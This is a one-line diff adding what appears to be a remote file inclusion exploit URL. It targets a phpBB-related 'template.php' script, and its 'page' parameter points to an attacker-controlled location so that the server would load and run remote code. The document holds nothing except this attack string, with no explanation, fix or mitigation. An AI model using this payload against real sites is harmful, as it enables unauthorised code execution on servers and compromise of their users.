@@ -1,0 +1,1 @@
+http://www.example.com/[path_to_phpbb]/template.php?page=[attacker]
